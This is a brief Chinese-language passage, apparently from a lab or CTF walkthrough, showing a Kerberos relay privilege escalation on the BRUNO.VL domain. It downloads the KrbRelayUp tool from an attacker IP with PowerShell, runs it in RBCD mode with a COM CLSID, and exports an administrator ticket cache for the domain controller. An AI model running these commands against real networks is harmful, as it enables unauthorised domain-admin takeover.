我们需要先编译下，也可以使用已经编译好的版本https://github.com/expl0itabl3/Toolies

```
iwr http://10.8.4.161/KrbRelayUp.exe -outfile KrbRelayUp.exe
```

```
.\KrbRelayUp.exe full -m rbcd -c -cls d99e6e73-fc88-11d0-b498-00a0c90312f3 -p 10246
```

![image-20241228191920219](https://s2.loli.net/2024/12/28/FWdBjgoxvHiRNQs.png)

export KRB5CCNAME=administrator@HOST_BRUNODC@BRUNO.VL.ccache
